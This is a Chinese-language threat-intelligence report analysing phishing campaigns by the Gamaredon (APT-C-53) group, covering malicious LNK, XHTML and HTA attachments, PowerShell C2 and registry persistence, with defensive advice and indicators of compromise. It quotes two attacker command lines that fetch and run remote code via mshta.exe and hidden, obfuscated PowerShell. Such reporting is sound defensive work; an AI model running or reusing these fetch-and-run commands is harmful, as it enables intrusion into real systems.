---
title: APT-C-53（Gamaredon）组织广泛攻击活动分析
url: https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&mid=2247505004&idx=1&sn=903d7e5ba2a23d6ecfbd81a1871a112c&chksm=f9c1e765ceb66e73a5b9d2e4b557ddd6564cc9528bd922a75af6760a1bd784c74e2ed7ce3ad3&scene=58&subscene=0#rd
source: 360威胁情报中心
date: 2024-12-05
fetch_date: 2025-10-06T19:41:15.730545
---

# APT-C-53（Gamaredon）组织广泛攻击活动分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2c6xto7naLTZdAu0sysvLwzZNdQYyYu3RHuZbEo7O2JW2MwZicnOXkSQ/0?wx_fmt=jpeg)

# APT-C-53（Gamaredon）组织广泛攻击活动分析

原创

高级威胁研究院

360威胁情报中心

**APT-C-53**

**Gamaredon**

APT-C-53（Gamaredon），又名Primitive Bear、Winterflounder、BlueAlpha，是一个自2013年起活跃的APT组织。该组织主要针对目标国家的政府、国防、外交、新闻媒体等领域进行网络攻击活动。

360高级威胁研究院对Gamaredon组织的几种常见攻击手段进行了深入分析。通过详细研究，我们发现该组织持续采用各种复杂的技术和策略，包括使用恶意LNK文件、XHTML文件以及复杂的网络钓鱼活动。

# **一、攻击活动分析**

## **1.攻击流程分析**

我们从钓鱼邮件开始，分析了四种不同的攻击载荷。这些攻击载荷通过邮件附件进行投递，旨在诱导用户执行附件中的文件或解压并运行压缩文件的内容。通过这样的手法，攻击者能够成功将恶意软件植入目标系统，进而展开进一步的恶意活动。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2ueIo6ic9HaGPUTVP4WmsVqeZHQXibpUIWc1w3LcmDibcGzxyXUibs2yEBQ/640?wx_fmt=png&from=appmsg)

攻击流程图

## **2.恶意载荷分析**

## 攻击者针对目标国家政府及其他关键组织或部门发送了精心设计的鱼叉式网络钓鱼邮件。这些邮件伪装成与目标相关的合法信息，旨在吸引目标用户的注意并诱使其打开附件。在分析过程中，我们发现了多种类型的恶意附件，其一是包含恶意LNK文件的恶意压缩文件。

![](https://mmbiz.qpic.cn/mmbiz_jpg/6CNEHNicic4PrHGBuMYaMPxHctTWIGwUDQYxITViaUzoZlIK2wo7tSRcKrScJicRZAVhdqJz76IjJndBVjI6IdMUJw/640?wx_fmt=jpeg)

包含恶意LNK的恶意邮件示例

恶意LNK文件通过利用mshta.exe执行远程恶意代码，具体命令行如下所示。

|  |
| --- |
| C:\Windows\System32\mshta.exe  http://5.181.159.32/t/intelligent.trim /f |

恶意LNK文件命令行示例

其二恶意附件形式是恶意XHTML文件。当用户打开这些文件时，页面会显示“Файл завантажено у папку 'DOWNLOADS'”（文件已上传至“DOWNLOADS”文件夹），同时自动下载一个恶意压缩文件。这种社会工程学手法旨在诱导受害者认为下载过程是安全且正常的，从而降低警惕性。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2edHhiaiatbia7CN8WID9gZxJeAib0ic0rNgW1ic3zKzjGNN6U3aX8Fm3jibSA/640?wx_fmt=png&from=appmsg)

包含恶意xhtml的恶意邮件示例

恶意xhtml代码主要负责将恶意压缩文件下载到用户系统中。此外，该恶意代码还集成了像素跟踪技术，用于标记用户是否已打开恶意文件。与之前描述一致，这些压缩文件同样包含恶意LNK文件，通过mshta.exe执行以获取后续载荷。除了直接通过IP地址进行通信外，我们还观察到访问了托管于trycloudflare.com上的恶意载荷。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2TvUelvls4ENjXiaHYNByMsqlJ2yicol0a6sFTnib3s1o2acNFc4AicQvXQ/640?wx_fmt=png&from=appmsg)

解码后恶意代码示例

在第二种类型的恶意附件中，还存在另一种变体。主要的HTML代码经过简单的混淆和编码处理，但其最终目的仍然是释放包含恶意LNK文件的压缩文件。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2EKInSSaZAnLOSIcysaIEuKbZibuo3TumLMGaYMSqx7IB57nP4Sjpujw/640?wx_fmt=png&from=appmsg)

混淆的和编码的恶意代码示例

在这一变体中，恶意LNK文件的命令行参数有所不同。尽管它们的基本结构相似，但主要区别在于所使用的命令行参数。这些LNK文件通常通过mshta.exe访问托管于trycloudflare.com上的恶意载荷。此外，我们也发现了访问固定IP地址上的载荷的情况，这些命令行参数基本一致，具体如下所示：

|  |
| --- |
| C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden  $a='htt','ps','://'; $s=$a -join'';$l=$s+'wilderness-activists-gazette-purse.trycloudflare.com/index.php';$r=iwr $l;$a = $r.Content;sleep 1;get-date; $a|powershell -noprofile - |

恶意LNK的命令行示例

从远程C2获取的代码为PowerShell类型，该代码在一个无限循环中每三分钟（180秒）执行一次请求函数。每次执行时，该函数会发送计算机名称和磁盘序列号到远程C2地址，并等待服务器的响应。

如果响应数据以"!"开头，则直接执行剩余部分。否则，对响应数据进行解码。解码过程使用磁盘序列号作为密钥进行XOR解码操作。解码完成后，启动一个新的任务来执行解码后的VBScript脚本。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx26g9Yj0SiaHhRXa40Ec5Pul9FZpIJSPDqwzicUP6oqA335oUMTT21iaQYA/640?wx_fmt=png&from=appmsg)

恶意的PowerShell代码示例

第三种攻击方式涉及使用与目标国家政府和军队相关的敏感信息作为诱饵。这些压缩文件内部包含一个诱饵PDF文档和一个恶意的HTA文件。压缩文件内的PDF文档包含无意义的数据，导致PDF文件出现损坏现象。这种设计旨在诱导用户忽略损坏的PDF文件，转而执行压缩文件中的HTA文件。恶意的HTA文件通过mshta.exe加载托管于trycloudflare.com上的恶意载荷。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2ic5CAY2qOs5v9UqpogjD6EWCCLictwvVcyPyic7CHn1icpUDLQ1zXm8ABw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2G9icoQtLBdzupezuN1UBjYAJqyFAAmUJpTcOHIQE3oNibPLxX7NZaYuA/640?wx_fmt=png&from=appmsg)

包含恶意HTA的恶意邮件示例

第四种攻击方式涉及在邮件中嵌入恶意压缩文件。这些压缩文件内部包含恶意LNK文件和PowerShell脚本文件。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2DUJKleQz0CDibNwia3hKvXLYU1BazwD62bZIPSeZZGtms9XSPeoibcjfA/640?wx_fmt=png&from=appmsg)

文件示例

恶意LNK文件的主要功能是执行另一个PowerShell脚本。解码和处理后的PowerShell代码首先从注册表中读取机器的唯一标识符，并将一段代码写入当前用户的注册表项。这段代码的功能是从HKCU:\System的run属性中获取并执行，确保在每次系统启动时运行。该注册表项的名称设置为用户的唯一标识符。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2QlmURwT9Ve3ZtYQr9Odk4qwTNicKLhicnEVpqTxLzNEPibcgsdQXntF9A/640?wx_fmt=png&from=appmsg)

 恶意代码示例

样本会将多个PowerShell功能模块写入HKCU:\System注册表中。首先是“入口模块”，该模块的主要功能是启动两个后台作业。第一个作业启动存储在注册表中的“通信模块”，负责与C2服务器进行通信。第二个作业启动“移动磁盘搜索模块”，用于搜索并感染连接到计算机的移动磁盘设备。随后，脚本会在450到600秒之间随机选择一个暂停时间，以避开检测并增加其隐蔽性。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2CxZBvug65KrUxib67ibXWTpWesEXEGoJcXb5LGEV2h4yU7RETS5wwNHw/640?wx_fmt=png&from=appmsg)

入口模块代码示例

“通信模块”首先尝试从%localappdata%\Winword\目录中的文件（在样本中为ps3.ras）中获取IP地址。如果获取失败，则执行“获取C2模块”来获取IP地址。接下来，样本会收集计算机名称、逻辑磁盘信息、卷序列号以及操作系统信息，并将这些信息发送到远程IP地址，然后接收响应内容。

样本读取响应文本并检查其长度。如果响应的第一个字符是“!”，则将其余部分作为代码执行。如果响应不符合预期，则从注册表中获取“代码执行模块”来处理响应体。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2OzadOKlK9Q82g5Z8pbEvnfX239SlDvdib0TprJ1WQ2ENzjaXTqd07XA/640?wx_fmt=png&from=appmsg)

通信模块代码示例

“获取C2模块”的主要功能是获取IP地址并保存到文件中。具体操作如下：

对于Windows 7及以下版本，模块生成随机字符串与硬编码域名拼接，尝试解析IP地址。如果失败，则使用curl命令从Telegra.ph或t.me URL获取数据。对于Windows 8及以上版本，模块通过cmd.exe执行curl命令获取IP地址；较低版本则使用MSXML2.XMLHTTP对象发送HTTP请求。如果仍未获取到有效IP地址，模块会使用随机进程名称和硬编码域名构建字符串，利用nslookup进行DNS查找。所有方法失败后，模块再次生成随机字符结合域名并尝试解析IP地址。一旦成功获取IP地址，模块会将其保存在%localappdata%\Winword\目录下的文件中。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2F8rmTmFdES0jhv7GKBkWRH4EePGMYjMiaY8Opcx7DEM0vt4460W14vA/640?wx_fmt=png&from=appmsg)

获取C2模块代码示例

对于“代码执行模块”，首先利用系统序列号与加密信息进行异或运算，解密得到明文代码。随后，模块启动一个后台作业执行该代码。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2M4ibIR0lEg5xNhff1NjSoBVtic2o8icpWnd2H7QsCt8BW4GAY4R33ubLQ/640?wx_fmt=png&from=appmsg)

 代码执行模块代码示例

在第二个后台作业中，“移动磁盘搜索模块”的主要功能是扫描系统中的可移动磁盘，寻找目录并在其中创建一个LNK文件。这个LNK文件的主要功能是通过PowerShell加载creditcard.lag文件。creditcard.lag文件的功能与此次分析的PowerShell脚本基本一致。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2pRiap2Dx6mHlOHwPapkoCazNXQsTvnKoO88d9pQesn2YISwtvbqHZlg/640?wx_fmt=png&from=appmsg)

移动磁盘搜索模块代码示例

在创建快捷方式后，“代码编码模块”将被执行。该模块的主要功能是处理和编码注册表中的PowerShell代码，使其形式与上文提到的Base64编码的PowerShell脚本一致。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2KRm5HnRTBB4UATyyYjgXYLkbLle9qP3X6G7ouPaRZsIdM3Bd6ZXKJQ/640?wx_fmt=png&from=appmsg)

代码编码模块代码示例

最后，样本会通过修改注册表来实现“入口模块”的自启动。具体操作是将“入口模块”写入注册表的启动项，这样每次系统启动时，“入口模块”都会自动执行，从而确保恶意软件的持久性和持续感染能力。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PpHrGqMbdZKpic0m52Pymqx2V51Xic555aDAdB0vy2WJicq6Ddib5aghhKuTMrl5OWsdgxM7eOEVrZOkg/640?wx_fmt=png&from=appmsg)

维持模块代码示例

# **二、归属研判**

360高级威胁研究院持续跟踪APT-C-53（Gamaredon）的相关攻击活动。上述分析仅展示了Gamaredon攻击活动的一部分，其相关攻击手段在以往的攻击行动中已有所展现。

# **三、防范排查建议**

* 强化邮件安全防护：部署先进的邮件网关解决方案，过滤和拦截恶意附件和钓鱼邮件，特别是含有LNK文件和恶意压缩文件的邮件；
* 加强系统和网络监控：实施全面的日志监控和分析，重点关注系统启动项、注册表修改以及PowerShell脚本的执行记录；
* 强化终端安全防护：安装360安全卫士，并确保所有终端设备安装并定期更新反病毒和反恶意软件，进行全面的恶意软件扫描。

#

**附录 IOC**

#

5d396bd183f92c377f726f86da37b52a

96E46EDD9A608562A23CF5E365FD006F

9de7fbf881956a127ba0b6c60e802ed1

badea5b4fc2762c8c5ecd27a025c3f22

C5D6534FC9ACFBC0B7230EE33B1D3F7C

a9f28fe5820c1c1feb26c35394b504f0

4282b160eb7bafca406f04af3cc688b8

47d8c24aff95739b4bb5d4c5d9fe893e

d406ad484de478e91fc7bc3177a4a712

02fe6a9b2b94588eb7250a524dfd1cf2

6A6C975CD114973F023491A702D8C022

http://5.181.159[.]32/t/intelligent.trim

https://mind-apple-slightly-twiki.trycloudflare[.]com/ug/intent/barley.tar

http://painful-pam-noise-operating.trycloudflare[.]com/index.php

http://painful-pam-noise-operating.trycloudflare[.]com/post.php

https://isp-quotes-yemen-spectrum.trycloudflare[.]com/sbu/broadcastingJTc/festivaljcO.epub

**团队介绍**

TEAM INTRODUCTION

**360****高级威胁研究院**

360高级威胁研究院是360数字安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pruscv37D0qgOMbfC4jVxUnso6yyhQC9OIyDNX6TYo5k8iafcfZMzT0ia5boCo69WZSicq7krbicKaHsw/0?wx_fmt=png)

360威胁情报中心

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pruscv37D0qgOMbfC4jVxUnso6yyhQC9OIyDNX6TYo5k8iafcfZMzT0ia5boCo69WZSicq7krbicKaHsw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
...